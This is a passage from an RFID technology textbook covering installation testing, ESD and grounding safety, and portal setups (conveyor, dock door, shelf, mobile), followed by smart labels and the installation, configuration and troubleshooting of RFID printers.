Use protective caps to cover the exposed parts of the cables, such as cuts.
■ 
The cable layout should be kept in an orderly fashion to avoid confusion and to 
have easy access for maintenance.
After you have set up an interrogation zone by installing a reader and its antenna and 
connecting them through a cable, you have an interrogation zone that you need to test.
Testing During Installation
Tests are the essential part of system deployment. There are four kinds of tests that you need 
to perform: interrogation zone tests, unit tests, application integration tests, and system tests.
Interrogation Zone Tests
After installing reader, antenna, and cables, make sure that the cables are connected cor-
rectly and that you are using the power supply appropriate for your purpose. Then turn 
the reader on.
Testing the interrogation zone involves three exercises:
1. Determine the boundaries of the coverage area (interrogation zone) by measur-
ing the signal strength at various points around the antenna, as described in the 
previous chapter.

 
Performing Installation • Chapter 8 
173
2. Verify the path loss contour mapping determined during site analysis, as described 
in the previous chapter. This involves making the ﬁ eld strength and signal strength 
measurements using a spectrum analyzer.

Test the system in a variety of conﬁ gurations for optimal performance.
TIP
Take notes during installation and testing. These notes will help you trouble-
shoot problems during deployment and during the regular operation of the 
system.
Unit Tests
A unit test, in general, is a test procedure used to validate that a particular component of a 
system (software, hardware, or both) is functioning properly with the promised performance. 
For example, you should perform a unit test on a reader to verify that it meets performance 
specs, such as read range and multiple tag read rate, as speciﬁ ed by the vendor.
If the reader is connected to a host computer where the RFID data is to be used by an 
application, you might need to perform an application integration test.
Application Integration Tests
An application integration test is performed to verify that the RFID system works properly 
in collaboration with the application to which it is integrated. For example, the host com-
puter might be sending requests to the RFID system to read the tags and send back the col-
lected data, the data sent back to the host computer will be analyzed by an application, and 
so on. You need to test that the RFID system works harmoniously with the application.
System Tests
The term system test refers to testing the features of the collective system, including all the 
subsystems such as RFID subsystems and application subsystems. Depending on the application 
requirements, these tests can include different data load and capacity tests. Load tests verify that 
the system has the processing power to handle the amount of data it is expected to handle, 
whereas capacity tests verify the system’s capability to produce the required output or results.
So, it’s important to ﬁ rst test the units separately to verify their features and performance 
and then test the whole system put together. These are also called preinstallation and 
post-installation tests.
The safety factor must be included in the installation and test process.

Chapter 8 • Performing Installation
Ensuring Safety
You must consider safety issues as a requirement rather than an option. When you are 
installing an RFID system, consider safety in the following three dimensions:
■ 
Ensure that the RFID components are installed with proper care and protection to 
avoid possible damage to the components and to ensure the proper operation of 
the installed system.
■ 
Ensure the safety of the personnel in the area.
■ 
Ensure that the installed system conforms to safety regulations.
To cover all these safety dimensions, you must consider the following factors during 
installation.
Equipment Safety from the Environment
You should be mindful of the environment in which the equipment is being installed. Harsh 
environmental conditions such as extreme temperature, humidity, moisture, and condensation 
can have adverse effects on both the propagation of RF waves and the RFID equipment 
itself. These conditions can create adverse effects such as absorption of the RF waves and can 
damage the equipment. The two ways to protect against these conditions are by moving the 
interrogation zone away from them or using the enclosures for the RFID equipment when 
possible.
When you consider using enclosures, the name to remember is National Electrical 
Manufacturers Association (NEMA), an organization that provides standards and enclosures 
for electrical equipment. NEMA-rated enclosures come in various types, such as NEMA 
Type 4 and NEMA Type 12, each offering a set of protections. Some of the common 
protections offered by NEMA type enclosures include the following:
■ 
Provide protection for personnel against accidental physical contact with the 
enclosed equipment.
■ 
Provide protection for the enclosed equipment against material that may have 
adverse effects on the equipment, such as dripping water, dust, rain, sleet, snow, 
splashing water, hose-directed water—you’ve got the idea.
■ 
Provide protection for the enclosed equipment against external formation of ice on 
the enclosure.
■ 
Provide protection against corrosion, which is the deterioration of essential proper-
ties of a material object due to reactions with its environment. A common example 
of corrosion is rust.

 
Performing Installation • Chapter 8 
175
Another source of possible damage that you need to protect against is electrostatic discharge.
Electrostatic Discharge
Electrostatic discharge, or ESD, is the instantaneous electric current created by the ﬂ ow of 
electrons from a high-density (of electrons) surface to a low-density surface—for example, 
when the two surfaces rub against each other. It could gradually degrade and damage a 
system component. In the environment of an RFID system, common sources of ESD 
include belts, conveyors, rollers, paper handling, and striping labels from rolls.
Some ESD protection techniques are listed in the following:
■ 
Wrist straps A wrist strap can be used as the primary method to ground person-
nel when they’re close to an unprotected ESD item. The wrist strap must be worn 
in direct contact with the wearer’s bare skin. Ensure that the ground connection 
end of the strap is securely connected to the ESD ground.
■ 
Groundable footwear Groundable footwear can be used as an alternative to the 
wrist strap, especially in a situation in which wrist straps are not appropriate or are 
unsafe to use.
■ 
Conductive mats Conductive mats can be used to ground personnel and 
furniture.
■ 
Plastic handles While near ESD-sensitive items, use plastic-handled hand tools 
such as pliers, screwdrivers, and wire strippers.
■ 
Relative humidity The relative humidity in the area where ESD protection is required 
must be above a minimum threshold value, say 30 percent. It must also be below an 
appropriate maximum limit because excessive humidity can cause problems such as 
corrosion, high-voltage leakage paths, and moisture contamination within the equipment.
■ 
Air ionization This technique is used to neutralize charges on ungrounded 
conductors and insulators.
■ 
ESD-protective packaging and storage The ESD sensitive items must be 
contained within approved ESD protective containers for movement in and 
between ESD-protected areas. When stored, ESD-sensitive items should be 
TIP
All NEMA enclosure types are described in NEMA Standards Publication 
250–1997: Enclosures for Electrical Equipment (1000 Volts Maximum).

176 
Chapter 8 • Performing Installation
contained within a static-shielding container. Direct contact of unprotected ESD 
items with metal shelves or cabinets must be avoided. Once the ESD-sensitive 
items stored in the cabinet are safely enclosed within ESD shielding, it is not 
necessary for the metal storage cabinets to be grounded.
CAUTION
Ordinary adhesive tapes such as a duct or masking tape can be highly chargeable. 
That means you should only use the approved tape near or in direct contact with 
an ESD-sensitive item. Do not use those tacky mats within a few meters (say, 3) of 
ESD-sensitive items. Also, unprotected ESD-sensitive items must not be passed 
from one individual to another unless both individuals are properly grounded.
ESD can damage the transistors in a tag’s IC, thereby causing the tag to malfunction. 
ESD can also damage the interrogator’s IC, especially if the interrogator is not properly 
grounded.
Grounding
Grounding refers to making electrical connection to the earth. The part directly in contact 
with the earth is called the earth electrode, and it can be as simple as a metal rod or a wire. 
Grounding provides a reference voltage level (zero) to electrical equipment and a sink to 
absorb electric charge under fault conditions. Grounding provides the following safety:
■ 
It can dissipate electrostatic buildup.
■ 
It is primarily used to prevent electric shock or ﬁ res caused by a voltage difference 
between the earth and a conducting material.
■ 
It is also often used as a protection against lightning strikes because it will harmlessly 
conduct the resulting excessive charge to the earth rather than starting ﬁ res and 
damaging equipment.
■ 
It is also used to control electrical noise and interferecne in electrical items such as 
computers, readers, and communication circuits.
CAUTION
An electrical ground must have enough charge-carrying (current) capability 
to serve as an effective zero-voltage reference level.

 
Performing Installation • Chapter 8 
177
While dealing with grounding, you must be careful to avoid the possibilities of ground 
loops.
Ground Loops
Ground loops in an electrical system are unwanted currents that ﬂ ow in a conductor connect-
ing two points that are supposed to be at the same potential, e.g. ground (or zero) potential, 
but are actually at different potentials. Different points on Earth may have different electrical 
potential—the difference could be as big as hundreds of volts—for example, due to the 
inﬂ uence of solar wind. Therefore, by grounding two components (say, readers) of a system 
to different points on Earth, you can create a ground loop. Such a condition could be very 
unsafe for a personnel operating or servicing the system.
A loop condition created by a ground point will cause energy transfer back to the 
connected devices and thereby will generate interference and noise. This can be avoided by 
ensuring that a loop condition does not exist—for example, by ensuring that the conductor 
used for grounding is short enough and that all the components (readers, in our case) are 
connected to the same grounding system.
Safety Regulations
During installation, you must recognize and conform to safety regulations regarding human 
exposure to the radiation emitted by the RFID system. Safety regulations and guidelines for 
human exposure to RF ﬁ elds are necessary because if the RF energy absorption exceeds a 
threshold value, adverse biological effects could occur. This issue was discussed in detail in 
Chapter 5.
So, during the deployment of an RFID system, you must consider both kinds of safety: 
protection of the equipment from the environment and protection of the environment 
(including personnel) from the equipment. Toward this end, deploying an RFID system 
involves creating RFID portals.
Working With Various Installation Scenarios
When you are installing an RFID system, you are basically deploying what are called RFID 
portals. An RFID portal is an area in which tags can be read or written to. Note the differ-
ence between the two interrelated terms: portal and interrogation zone. When you mount a 
reader, you have portal. When you turn the reader on, you have an interrogation zone on the 
portal. From an installation viewpoint, the readers are divided into three categories:
■ 
Fixed-mount interrogators
■ 
Vehicle-mount interrogators
■ 
Handheld interrogators

178 
Chapter 8 • Performing Installation
These categories were discussed in Chapter 4. Vehicle-mount and handheld interrogators 
are also collectively called mobile interrogators. So, most installation scenarios can be grouped 
into two categories: mobile reader installation and ﬁ xed-mount reader installation. While 
installing readers, always remember that you are installing an RFID portal, which is an area 
in which the tags cab be read or written to. Corresponding to ﬁ xed-mount and mobile 
readers, there are stationary ports and mobile ports.
Setting Up Stationary Portals
A stationary portal is set up by installing a ﬁ xed-mount reader. In ﬁ xed-mount reader 
scenarios, the tags go to the reader to be read. In other words, the reader waits for the tags 
to pass through its interrogation zone, and when they do, it reads them.
Setting Up a Conveyor Portal
Conveyors are used for case-level tracking—for example, in airports. This scenario has the 
following elements already ﬁ xed for you:
■ 
The tags are moving at a certain speed.
■ 
The tags are not oriented in a certain direction.
This situation requires that you use multiple readers for optimal results. The reader 
antennas are often mounted on gantries placed around the conveyor, as shown in Figure 8.2. 
The reader antennas on each side of the gantry will cover four faces of the container: up, 
down, and two side faces.

Performing Installation • Chapter 8 
179
Other things that you should consider while setting up a conveyor portal include the 
following:
■ 
To avoid signal reﬂ ection by metal and other adverse effects, keep the antennas 
comfortably away from the conveyor edges; about 45 cm (1.5 feet) away is a good 
rule of thumb.
■ 
One of the four antennas will be positioned under the conveyor. You might ﬁ nd 
antennas designed for optimal operations under the conveyor.
■ 
While conﬁ guring the reader for read-related parameters, keep in mind the speed 
of the conveyor (that is, as much time a tag has in the interrogation zone), which 
will also affect the number of attempts a reader can make to read a tag. A reader 
must be able to make multiple attempts to read a tag.
■ 
The polarization and alignment of reader antennas should be compatible with 
random orientation of tags.
■ 
While conﬁ guring the power emitted by the reader antenna, keep in mind the 
following two opposing factors:
■ 
There must be enough power to offer a large enough read range and 
interrogation zone.
■ 
The power must be kept within the safety regulations set by local, regional, 
national, and international regulatory bodies. This is important for protecting 
personnel in the area against radiation.
TIP
Because the conveyor is moving, a tag has only a limited amount of time in 
the interrogation zone. So, avoid writing to the tag on the conveyor, because 
it will consume some time. Also, the write requirements for power and 
distance are different from the read requirements.
So, conveyors pose a speed challenge to RFID systems. The higher the conveyor, the 
higher must be the reader’s read speed. Readers have different read speeds, which can vary 
from about 25 tags/sec to well over 1000 tags/sec. However, you can ﬁ nd readers that can 
handle a conveyor speed of up to 600 feet/sec.
Conveyors are good for case-level reading, whereas dock doors are suitable for 
pallet-level reading.

180 
Chapter 8 • Performing Installation
Setting Up a Dock Door Portal
Dock door portals are used for pallet-level tracking. They read the tags on items passing 
through a gateway such as a door. This scenario has the following elements already ﬁ xed 
for you:
■ 
The region outside but near the door can be used for temporary staging of items 
for shipment. Those items must not be read by the readers in the door portal.
■ 
The tag items will pass through the door—that is, they will be in the interrogation 
zone for only a short period.
■ 
The way the tagged items are transported through the dock door, such as on a fork-
lift, will determine the height at which an interrogation zone should be set up. The 
door size will also affect the determination of read range and interrogation zone.
■ 
The dock door areas are usually busy with activities.
These situations require that you consider the following points while installing a dock 
door portal:
■ 
Keep the cables out of harm’s way.
■ 
Make sure that the antennas are protected against accidental damage. You might 
consider a rack solution for antennas on two sides of the door.
■ 
To offer the required read range, a UHF system is usually appropriate for this 
scenario.
■ 
The antenna power should be high enough to offer the required read range but 
should be within the limits set by safety regulations. Also, too high a power can create 
stray read problems and interrogation zone overlaps.
■ 
The number of antennas should be large enough to cover the width and the 
expected height at which the tagged items will be passing. Too many antennas 
could create the dense interrogator environment problem discussed in 
Chapter 4.
■ 
Depending on the situation, there are several possible antenna placement 
solutions:
■ 
Two antennas on each side of the door: four antennas in total. A rack 
solution can be used if required for protection. An example of this scenario 
is shown in Figure 8.3.
■ 
Four antennas on each side of the door: eight antennas in total. A rack 
solution can be used if required for protection.

 
Performing Installation • Chapter 8 
181
■ 
On antenna mounted overhead. This solution provides protection for the 
antenna.
■ 
Two antennas mounted overhead, looking into the door interior from the 
two corners of the door. This solution provides protection for the antennas.
■ 
While positioning antennas, to avoid interference, make sure the antennas from two 
sides of the door are not directly pointing at each other.
Figure 8.3 An Example of a Dock Door Portal With Four Antennas
Antenna 1
Antenna 2
Antenna 3
Antenna 4
So, the main challenges posed by the dock door portal scenario are the following:
■ 
Multiple dock doors adjacent to each other can create interrogation zone overlap 
problems, causing signal interference and reading tags from the other door.
■ 
Because there could be items staged for shipping near the dock door, a reader on a 
dock door, if not properly conﬁ gured and tuned, might read tags from the region 
outside the door—stray tag reads.
■ 
The movement around a dock door poses the risk of damage to the RFID components. 
Therefore, the cables and the antennas must be protected against incidental damage.
Setting Up a Shelf Portal
This scenario has the following elements already ﬁ xed for you:
■ 
The items on the shelf could have liquid content, and there might be metal in the 
vicinity.

182 
Chapter 8 • Performing Installation
■ 
The number of items on the shelf keeps changing—that is, customers take the 
items away and more items are put into the shelf at a later time.
■ 
The items will most probably be read from rather a close distance—say, less than 
6 inches.
The most suitable RF to meet these requirements is HF—that is, 13.56 MHz. This 
frequency will give enough read range and will be relatively less affected by metals and liq-
uid content—and therefore less vulnerable to effects such as absorption. Other things that 
you should consider as you install shelf portals include the following:
■ 
You can create a multishelved portal with one antenna per shelf using a multian-
tenna reader. In this case, you can conﬁ gure the reader to use the antennas for reads 
in some sequential order.
■ 
If the change in the number of items on the shelf needs to be detected, the readers 
should be conﬁ gured to either continuously keep reading the tags or have read 
cycles at a preset intervals. You need to consider the reading requirement while 
you’re making the buying decision, because different readers from different vendors 
could offer different features and options.
■ 
The reader antennas should be properly placed, conﬁ gured, and oriented to avoid 
interference between neighbor antennas.
TIP
Unlike the dock door and conveyor portals, you have more control over the 
tags in a shelf portal. For optimal reads, make sure that the tags are oriented 
at right angles to the RF ﬁ eld coming from the reader antenna. If they are 
parallel to this ﬁ eld, no signal will be received, and hence no communication 
will occur between the reader and the tag.
So, the main issues in setting up a shelf portal are:
■ 
Ensure proper orientation of the tags in the shelf so that they can be optimally read.
■ 
Select the proper time interval between consecutive read cycles so that the change 
in items in the shelf can be optimally recorded.
Depending on the application requirements, you may also use the mobile reader to read 
tagged items in the shelves.

 
Performing Installation • Chapter 8 
183
Setting Up Mobile Portals
A mobile portal is set up by installing a mobile reader. In the mobile reader scenario, the 
reader goes to the tag to read it.
Handheld Interrogator Portals
A handheld interrogator contains the whole reading system in one device and offers the 
maximum ﬂ exibility. You can take the interrogator to the tagged item and collect the 
information. Because handheld interrogators are usually used for close reads, interference 
from other RF devices and other adverse effects such as reﬂ ection and scattering due to 
neighbor objects are usually not issues. However, you still need to conﬁ gure the reader 
according to the required read range.
Mobile-Mount Portals
A mobile mount portal is set up by mounting a reader on a vehicle such as a forklift. For 
example, you can collect information from tagged items on pallets in a storage room by 
driving an RFID-enabled forklift down the aisle. In a forklift scenario, the following 
parameters apply to the environment:
■ 
Avoid harsh environmental conditions—for example, cold temperature in a storage 
room.
■ 
Eliminate unfriendly material such as metals that will reﬂ ect the signal.
■ 
You will need a wireless connection for the RFID system to send data to a central 
place such as a data warehouse.
■ 
The reader will be in motion.
■ 
You will need a power supply in the vehicle.
This scenario requires you to consider the following:
■ 
You can mount the reader on either the interior or the exterior of the vehicle.
■ 
In case you decide to mount the reader on the exterior of the vehicle, consider the 
adequate clearance from external objects such as doorways.
■ 
The reader must be protected against mechanical shocks and vibrations.
■ 
The mobile RFID system will most probably be using the wireless network for 
transferring data to a central location. Therefore, the possibility of interference with 
other EM devices should be considered.

184 
Chapter 8 • Performing Installation
So, the main challenges of a forklift-based mobile RFID portal are wireless network 
and harsh environmental conditions, including extreme temperatures, metallic material, 
mechanical shocks and vibrations, and so on.
The three most important takeaways from this chapter are the following:
■ 
Consider implementation as a process that has input, actual implementation tasks, 
and output. The input items are information from design selection and site analysis, 
the actual tasks are the installation tasks, and the output is the deployed system that 
will need to be managed.
■ 
Hardware installation must include testing and conformance to safety regulations.
■ 
A given installation scenario will have its own installation issues, and the emphasis 
on some installation issues might vary from one installation scenario to another.

 
Performing Installation • Chapter 8 
185
Summary
Deployment of an RFID system is a process that takes information from system design and 
site analysis as an input, involves performing actual installation tasks, and considers the 
installed system as an output. For optimal results, the installation must be planned, which 
includes considering power sources and system variables such as operating frequency, 
operating environment, number of antennas, and so on. Hardware components such as 
readers and antennas must be tested as units for their features and performance before 
installing them into a system, where they will be tested again as part of the system test. While 
making installation decisions and during the actual installation, you must conform to the 
safety requirements that involve both protecting the equipment from the environment as 
well as protecting the environment (including personnel) from the equipment. You must 
consider all the possible installation scenarios available to you and choose the one that best 
suits the situation. Each installation scenario may have its own installation issues.
So, now you have implemented a basic RFID system. But your site might need 
additional devices such as an RFID printer to support the RFID system. We explore this 
topic in the next chapter.

Chapter 9 • Working With RFID Peripherals
Introduction
RFID begins where barcode technology ends. A so-called smart label combines a \ barcode 
with an RFID tag. Smart labels have the intelligence and functionality of a tag and the 
printing convenience of a barcode label. Therefore, by using smart labels, corporations can 
leverage their existing labeling infrastructure to incorporate RFID.
Smart labels are created by RFID printers, which are peripheral devices, and they are 
applied to the items to be tracked by using another peripheral device called an automatic label 
applicator. The third kind of peripheral or ancillary device used in RFID networks is called a 
feedback system, which helps build effective, robust, and automatic RFID networks.
So, the core issue in this chapter is the role of peripheral devices in RFID. To understand 
this issue, we will explore three avenues: RFID printers, RFID label applicators, and RFID 
feedback devices.
Smart Labels: Where RFID Meets Barcode
Upon the arrival of RFID, the industry was using the barcode technology to identify items. 
A barcode (also written as bar code) is a machine-readable representation of information 
printed on a surface in a visual format. Almost everything that you buy from retailers these 
days has a barcode printed on it, which helps manufacturers and retailers keep track of 
inventory. Barcodes can be read by optical scanners, also called barcode readers. These codes 
serve as product “ﬁ ngerprints” made of machine-readable, parallel bars that store binary code, 
as shown in Figure 9.1.
Figure 9.1 An Example of a Barcode
NOTE
Barcode labels are also called Universal Product Code (UPC) labels or UPC bar-
codes. UPC is the encoding scheme, or data structure, used to write barcodes, 
widely used in the United States and Canada on items in retail stores.

 
Working With RFID Peripherals • Chapter 9 
189
RFID tags offer what barcodes offer, plus lot more. For example, barcodes, once 
created, can only be read, whereas you can modify the information on the writable tags. 
Furthermore, the tags can store a lot more information, and they can become part of the 
global network. However, the procedures and infrastructure for barcodes (also called labels) 
is already in place. The incorporation of RFID tags into the existing labeling (barcode) 
technology gave rise to the smart label, which is basically a barcode label that contains an 
RFID tag embedded in it. It’s called a smart label because it contains more information and 
has more capabilities than the barcode label. For example, with a smart label attached to it, 
an object can be tracked by an automated RFID system without manual intervention. By 
tracking the object globally using the EPCglobal network, you can automate its ﬂ ow 
through the supply chain. This will result in supply chains that can tune themselves 
automatically to respond efﬁ ciently to the changing demands of the consumer: a big win. 
Supply chain is just one of a multitude of RFID applications with advantages of the same 
magnitude.
As an example, Figure 9.2 shows a roll of smart labels. Like a label, they can be 
conveniently printed on and attached to an object, and they have all the capabilities of an 
RFID tag—the best of both worlds. These labels were created on an RFID printer.

Marking Systems Inc., www.webermarking.com)
Working With RFID Printers
An RFID printer, also called a smart label printer, prints, well, smart labels. In this 
section, we will explore what a smart label printer is and how you install, conﬁ gure, 
and troubleshoot it.

190 
Chapter 9 • Working With RFID Peripherals
NOTE
The word periphery has its origin in a Greek word that means circumference 
or outer surface. So periphery, in general, means boundary or outer part of 
something: body or space. In the computer industry, a peripheral (also called 
a peripheral device) is a device that is not required for the computer to 
function, but it is used to expand the capabilities of the computer. For 
example, a printer attached to a computer is a peripheral device.
Understanding RFID Printers
An RFID printer is an RFID peripheral device that can print human-readable information 
on the surface of a smart label and can write data to the transponder (tag) inside the label. 
It’s also called a smart label printer or RFID printer/encoder. In other words, the RFID printer 
combines the functionalities of a traditional barcode (or label) printer and an RFID encoder 
to create (print and encode) smart labels.
So, a smart label can contain UPC barcode information printed on its front surface as 
well as the information written (encoded) to an RFID tag sandwiched between its outer 
printable layers. Typical RFID printers encode data onto the HF (13.56 MHz RFID) and 
UHF (915 MHz RFID) tags. These printers can be connected to a PC via a port (parallel, 
serial, or USB) or through a network connection such as Ethernet and used as output 
devices. Typical RFID printers offer the following functionality:
■ 
Print text on the surface of a smart label, e.g., destination address
■ 
Print linear and 2-D barcodes on the surface of a label, which will 
be scannable
■ 
Print graphic images on the surface of a label
■ 
Write (encode) information to the tag inside a label
■ 
Read the encoded information
■ 
Verify the accuracy of the information
■ 
Mark a faulty label and proceed to the next label
From now on in our discussion, by label we mean smart label, unless speciﬁ ed otherwise.

Technologies, an example of a smart label printer that produces smart labels compliant

Following are the typical requirements that you should consider in selecting a printer:
■ 
Accuracy veriﬁ cation Seriously consider whether the printer has a feature to 
automatically void the faulty label, e.g., the label that has the transponder that does 
not respond properly to the read/write instructions from the printer.
■ 
Compliance Ensure that the printer meets compliance requirements. For 
example, an RFID printer to be used for passive UHF EPC smart labels must 
have been tested to be EPC compliant.
■ 
Environmental condition Consider the environmental condition such as 
temperature in which the printer will be used. This could help you determine 
the features, such as temperatures in which the printer can operate safely.
■ 
Flexibility Consider the ﬂ exibility the printer provides in terms of properties 
such as the following:
■ Does it support various label sizes?
■ Does it support multiple tag protocols?
■ Does it let you conﬁ gure the number of attempts it will make to write to 
the tag? This will let you have control over the time it will spend on faulty 
tags and the volume of error messages it will generate as a result.
■ 
Quantity of labels Consider the volume of labels that you will be printing in the 
short and long term. This might help you determine features such as printing speed.
■ 
Software support Ensure that the printer has the required software support.

Once you have selected and purchased an RFID printer suitable for your needs, it’s time 
to install it.
Installing the RFID Printer
Although details about installing a printer can vary from printer to printer, the overall process 
is the same for all RFID printers. The main tasks in installing the printer are unpacking the 
printer, placing it ﬁ rmly at a selected site, making all the connections, loading the printer 
with media and ribbon, and executing any installation software.
CAUTION
Install the label stock between the printhead and the platen before closing 
the pivoting deck; otherwise, the debris on the platen may damage the 
printhead. Also, do not touch the printhead or the electronic components 
under the printhead assembly.
You can install an RFID printer by following the instructions in the manual that will 
come with the printer. However, the main steps are listed in the following as a high-level 
view of the installation procedure:
1. Unpack and check the content Make sure all the listed items are present in 
the package.
2. Select a printer site The printer must rest safely on a solid, leveled surface, and 
there must be enough access space for activities, such as proper ventilation and 
cooling, opening it to change the media, and so on. In selecting the printer space, 
you should also consider the interference from other RF devices, such as readers 
and cell phones.
3. Connect the power cables
a. Make sure the printer’s power switch is in the Off position.
b. Attach the AC power cord to the AC power receptacle in the back of 
the printer.
c. Attach the AC power cord to a grounded (three-prong) electrical outlet 
of the proper voltage.
4. Load the printer Load the printer with labels and ribbon. The instructions 
might be shown right on the printer panel.
5. Power on the printer

194 
Chapter 9 • Working With RFID Peripherals
6. Run the installation program The installation software might come with the 
printer, or you might need to download it from a Web site. However, if you have 
thought through the various options, this part of the installation should not be 
difﬁ cult. Just follow the instructions from the software program and make your 
choices. You might need to choose port type and connection type between the 
computer and the printer. If your RFID system uses the network and you want to 
make the printer part of the network, connect it to the print server.
While handling the printer during or after installation, take the following precautions:
■ 
During unpacking or handling, do not place the printer on its backside, because it 
may damage the printer interface connector.
■ 
While setting up a printer, avoid touching the electrical connectors to prevent 
damage due to ESD. The ESD can damage or destroy the printhead or electronic 
components in the printer.
■ 
Make sure the printer is properly grounded. Failure to do so could result in electric 
shock to the operator. To comply with international safety standards, printers are 
usually equipped with a three-pronged power cord; one of the three prongs is the 
ground prong. In this case, do not use adapter plugs, and do not remove the ground 
prong from the cable plug. If you do need an extension cord, make sure it uses a 
three-wire cable with a properly grounded plug.
■ 
Verify the required voltage on the printer’s model number label on the back of the 
printer.
■ 
Never operate the printer on its side or upside down.
■ 
If you are using direct thermal mode, clean the platen roller, printhead, and lower 
and upper media sensors every time you change the media.
Smart label printers usually use the following thermal printing techniques to print:
■ 
Thermal transfer printing A printer using this technique prints on a medium 
such as paper by melting a coating of ribbon that will stay glued to the medium. 
This technique, by deﬁ nition, requires a ribbon.
■ 
Direct thermal printing A printer using this technique prints on a medium 
such as paper by selectively heating the coated thermochromic medium when the 
medium passes over the printer’s thermal printhead. This technique does not 
require a ribbon. Thermochromism is the property of a material to change color due 
to a change in temperature.
During or after installation, you will need to conﬁ gure the printer to customize it 
according to your needs.

Conﬁ guring the RFID Printer
RFID printers typically offer a degree of ﬂ exibility by allowing you to conﬁ gure the values 
for a set of properties. The exact set of conﬁ guration properties and the values of their range 
may change from printer to printer. But to give you a practical feel, we use a real printer 
(the SL5000e Smart Label RFID Thermal Printer from Printronix) as an example, to discuss 
the conﬁ guration properties that are typically available in most RFID printers. These 
properties include the following:
■ 
Label length This is the length of the smart label. In most applications, the label 
length that you choose will match the physical label length—that is, the actual label 
length of the media installed.
■ 
Label width This property speciﬁ es the width of the label.
■ 
Media-handling method This property speciﬁ es how the printer will handle 
the media (label stock):
■ Peel-off In this method, the optional rewinder is installed, and it prints 
and peels die-cut labels from the liner without assistance. The printer waits 
for you to remove the label before it can move to print the next label; this 
is also called on-demand printing. The printer displays the “Remove Label” 
message to remind you to remove the label before it can print the next one.
■ Tear-off With this method, the printer positions the label over the tear 
bar after printing and waits for you to tear off the label before printing the 
next one; this is also called on-demand printing. The printer displays the 
“Remove Label” message to remind you to remove the label before the 
next one can be printed.
■ Tear-off strip With this method, the printer will print on the media and 
send it out the front until the print buffer is empty; then it positions the last 
label over the tear bar for removal.
■ Cut With this method, given that the optional media cutter is installed, 
it automatically cuts media after each label is printed, or it can cut after a 
speciﬁ ed number of labels have been printed using a software cut 
command.
■ 
Orientation This property speciﬁ es the image orientation that will be used 
when printing the label.
■ 
Paper feed shift This property represents the distance to advance a label or pull 
back when the tear-off strip, tear-off, peel-off, or cut media-handling option is 
enabled. In other words, it helps position the label.

196 
Chapter 9 • Working With RFID Peripherals
■ 
Print intensity This property speciﬁ es the level of thermal energy from the 
printhead to be used for the given type of media and ribbon installed. A large value for 
this property means more heat (thermal energy) will be applied for each dot, which in 
turn affects the print quality.
■ 
Print mode This property speciﬁ es the type of printing to be performed:
■ Transfer Indicates thermal transfer printing mode that uses the 
heat-sensitive ribbon to perform heat-based printing.
■ Direct Indicates direct thermal printing mode (no ribbon) that uses 
special heat-sensitive media to perform heat-based printing.
■ 
Printing speed This property speciﬁ es the speed in units of inches per second 
(ips) at which the media (label) passes through the printer when printing.
■ 
Save-conﬁ g property This property allows you to save up to eight unique 
conﬁ gurations to meet different print job requirements.
■ 
Save-up conﬁ g This property allows you to specify that the factory conﬁ guration 
or any one of the eight possible saved conﬁ gurations be used as the power-up 
conﬁ guration.
The range of values and the default value for each of these properties is shown in Table 9.2 
for a speciﬁ c printer as an example.

NOTE
The print intensity and the print speed must be compatible with the media 
and ribbon type to achieve the optimal print quality and barcode grades. 
Also, the maximum print speed depends on the maximum printer width and 
the print resolution (dots per inch).
So, you have installed and conﬁ gured your printer and are ready to roll. However, keep 
in mind that errors and problems are part and parcel of life, even in the technology world. 
This is where troubleshooting skills come handy.
Troubleshooting the RFID Printer
The RFID encoder in an RFID printer can detect a number of errors. When one of 
these errors occurs, the RFID encoder instructs the printer to perform the currently 
selected error action and displays the appropriate error message on the control panel’s 
LCD, as shown in Table 9.3. The error action is selected according to the value of the 
Error Handling parameter on the RFID Control menu, which you can set to one of the 
following values:
■ 
None No speciﬁ c action is taken. The printer will discard the failing label data 
and continue to the next smart label.
■ 
Overstrike (the default) The unacceptable smart label will be printed with a 
grid or error message over the label. If the Label Retry Count is greater than zero, 
the same smart label will be tried over and over again until the label retry count is 
exhausted. In case of a failure, after the last try the error message will be printed if 
the Overstrike Style is set to Error Type Msg. These error messages are shown in 
Table 9.4. If the Overstrike Style is set to Grid, a grid pattern will be printed 
instead of an error message. The failed label will not be reprinted.

■ 
Stop The printer discards the failing label data, displays the error message 
“RFID Error: Check Media,” and halts. The failed label is discarded, and 
reprinting of the labels must be initiated by the host. Once the error is cleared, 
the label with the failed tag moves forward until the next label is in the position 
to be printed.
So, if an RFID tag within a smart label is found unacceptable after performing a deﬁ ned 
number of retries, one of these actions is performed.

Chapter 9 • Working With RFID Peripherals
CAUTION
Before performing any maintenance procedure, always disconnect the AC 
power cord from the printer or from the power outlet. Failure to remove power 
could result in injury to you, damage to equipment, or both. If applying the 
power is necessary at some step of the procedure, according to the 
documentation, always consider the fact that the power is on and proceed 
carefully.
A standard technique in troubleshooting, which also equally applies to printer problems, 
is the fault isolation technique. You improve your chances of identifying the cause of the 
problem by following this technique:
1. Collect information. Ask the user (reporting the problem) to describe the 
problem. Collect as much relevant information as you can.
2. Reproduce the problem. Verify the problem by running a diagnostic printer test 
in which you replicate the conditions reported by the user and reproduce the 
problem.
3. Look for the standard error messages to start troubleshooting.
4. If you cannot get an error message described in the troubleshooting table of 
the documentation, use the so-called half-split method to narrow down the 
problem area:
a. Start at a general level and work your way down to details.
b. Isolate the faults by narrowing down to half the remaining system at a time, 
until the ﬁ nal half is a ﬁ eld-replaceable unit or assembly.
5. Make one change at a time or one corrective action at a time. Test the printer 
operation after every corrective action.

Solution
 
2. Ensure that you are using the correct media: smart
 
 
labels with RFID tags located in the correct position.
 
3. The RFID tag is possibly defective. Try another tag.
 
4. Ensure that the application does not send too few
 
 
or too many digits to the RFID tag.

 
Working With RFID Peripherals • Chapter 9 
201
6. Replace the defective unit or assembly. Do not attempt ﬁ eld repairs of electronic 
components or assemblies. Most electronic problems are corrected by replacing 
the printed circuit board assembly, sensor, or cable that causes the fault 
indication.
7. Install any part you replaced earlier to diagnose the problem and that was not 
found defective.
8. Test the printer again. Return the printer to normal operation when the reported 
symptoms disappear.
After you have created the smart labels with the RFID printer, you will need to apply those 
labels to the products that need to be tracked. You might also need some device that will give 
you feedback on how your RFID system is doing. All these devices are called ancillary devices.
Understanding Ancillary Devices 
and Concepts
Ancillary devices are the devices that might not be an essential part of a core system but are 
useful additions to it. RFID encoders and label applicators are examples of ancillary devices 
in an RFID system.
NOTE
The word ancillary means something of secondary importance; something 
subordinate to something else. For example, an instructor’s manual is 
ancillary to the textbook.
Encoders and Label Applicators
RFID printer encoders are used to write information on a tag inside a smart label, and label 
applicators are used to apply smart labels to items that need to be tracked.
